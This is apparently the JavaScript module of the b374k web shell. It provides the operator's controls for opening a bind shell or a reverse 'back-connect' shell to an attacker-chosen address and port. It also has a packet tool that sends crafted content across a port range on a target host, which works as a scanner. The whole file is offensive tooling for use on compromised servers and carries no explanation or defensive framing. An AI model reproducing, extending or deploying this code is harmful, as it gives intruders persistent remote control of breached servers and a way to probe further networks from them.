Zepto(function($){
	rs_init();

});

function rs_init(){
	if(evalReady&&(evalSupported!=null)&&(evalSupported!='')){
		splits = evalSupported.split(",");
		$.each(splits, function(i, k){
			$('.rsType').append("<option>"+k+"</option>");
		});
	}
	else setTimeout('rs_init()', 1000);

	$('#packetContent').on('keydown', function(e){
		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
			packet_go();
		}
		fix_tabchar(this, e);
	});
}

function rs_go_bind(){
	rs_go('bind');
}
function rs_go_back(){
	rs_go('back');
}

function rs_go(rsType){
	rsArgs = "";
	if(rsType=='bind'){
		rsPort = parseInt($('#bindPort').val());
		rsLang = $('#bindLang').val();
		rsArgs = rsPort;
		rsResult = $('#bindResult');
	}
	else if(rsType=='back'){
		rsAddr = $('#backAddr').val();
		rsPort = parseInt($('#backPort').val());
		rsLang = $('#backLang').val();
		rsArgs = rsPort + ' ' + rsAddr;
		rsResult = $('#backResult');
	}

	if((isNaN(rsPort))||(rsPort<=0)||(rsPort>65535)){
		rsResult.html('Invalid port');
		return;
	}

	if(rsArgs!=''){
		send_post({ rsLang:rsLang, rsArgs:rsArgs },
			function(res){
				if(res!='error'){
					splits = res.split('{[|b374k|]}');
					if(splits.length==2){
						output = splits[0]+"<hr>"+splits[1];
						rsResult.html(output);
					}
					else{
						rsResult.html(res);
					}
				}
			}
		);
	}
}

function packet_go(){
	packetHost = $('#packetHost').val();
	packetStartPort = parseInt($('#packetStartPort').val());
	packetEndPort = parseInt($('#packetEndPort').val());
	packetTimeout = parseInt($('#packetTimeout').val());
	packetSTimeout = parseInt($('#packetSTimeout').val());
	packetContent = $('#packetContent').val();
	packetResult = $('#packetResult');
	packetStatus = $('#packetStatus');

	if((isNaN(packetStartPort))||(packetStartPort<=0)||(packetStartPort>65535)){
		packetResult.html('Invalid start port');
		return;
	}
	if((isNaN(packetEndPort))||(packetEndPort<=0)||(packetEndPort>65535)){
		packetResult.html('Invalid end port');
		return;
	}
	if((isNaN(packetTimeout))||(packetTimeout<=0)){
		packetResult.html('Invalid connection timeout');
		return;
	}
	if((isNaN(packetSTimeout))||(packetSTimeout<=0)){
		packetResult.html('Invalid stream timeout');
		return;
	}

	if(packetStartPort>packetEndPort){
		start = packetEndPort;
		end = packetStartPort;
	}
	else{
		start = packetStartPort;
		end = packetEndPort;
	}

	packetResult.html('');
	while(start<=end){
		packetPort = start++;
		packetResult.append("<hr><div><p class='boxtitle'>Host : "+html_safe(packetHost)+":"+packetPort+"</p><br><div id='packet"+packetPort+"' style='padding:2px 4px;'>Working... please wait...</div></div>");
		packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent);

	}
}

function packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent){
	send_post({packetHost:packetHost, packetPort:packetPort, packetEndPort:packetEndPort, packetTimeout:packetTimeout, packetSTimeout:packetSTimeout, packetContent:packetContent}, function(res){
		$('#packet'+packetPort).html(res);
	}, false);
}